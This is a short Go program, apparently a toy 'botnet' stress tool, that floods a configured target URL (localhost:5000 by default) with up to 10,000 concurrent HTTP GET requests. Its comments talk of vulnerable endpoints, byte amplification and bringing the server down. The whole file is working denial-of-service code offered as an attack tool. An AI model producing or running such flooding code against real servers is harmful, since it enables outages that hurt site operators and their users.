package main

import (
	"fmt"
	"net/http"
	"strconv"
)

type botnet struct {
	targetHost    string
	serverPort    string
	channel       chan string
	weakEndpoints []string
	maxRoutines   int32
	httpVerb      string
}

// init is a mandatory method to call after declaring a `botnet`.
// Initializes the botnet with default values.
func (b *botnet) init() {
	// The target server (along with port if not 80 or 443)
	(*b).targetHost = "http://localhost:5000"

	// Set the port where this script is to be mounted (string)
	(*b).serverPort = "8080"

	// The default channel for all subsequent goroutines
	(*b).channel = make(chan string)

	// A string slice of most vulnerable endpoints
	(*b).weakEndpoints = []string{
		"/",
	}

	// The default HTTP method to use
	(*b).httpVerb = "GET"
	// TBD: Use a map of endpoints-methods.

	// Set the maximum value of goroutines to execute.
	// More threads => more load, but higher CPU use.
	// But, definitely worth increasing if byte amplification is followed on
	// most endpoints.
	(*b).maxRoutines = 10000
}

// displayConfig prints values of all members of `botnet` to the console.
func (b botnet) displayConfig() {
	fmt.Println("Target Host:", b.targetHost)
	fmt.Println("Server Port:", b.serverPort)
	fmt.Println("Channel:", b.channel)
	fmt.Println("Weak Endpoints:", b.weakEndpoints)
	fmt.Println("HTTP Verb:", b.httpVerb)
	fmt.Println("Max Routines allowed:", b.maxRoutines)

}

// attack receives no arguments, but utilises all neccessary members of the
// `botnet` struct.
// Starts a series of goroutines.
func (b botnet) attack() {
	if b.httpVerb == "GET" {
		fmt.Println("Starting routines...")
		for i := b.maxRoutines; i > 0; i-- {
			go func(c chan string, idx int32) {
				_, err := http.Get(b.targetHost)
				if err != nil {
					fmt.Println("ERROR:", err.Error())
					fmt.Println("Perhaps the server went down!")
				}
				c <- "END ROUTINE " + strconv.Itoa(int(idx))
			}(b.channel, i)
		}
		for i := b.maxRoutines; i > 0; i-- {
			fmt.Println(<-b.channel)
		}
	}
}
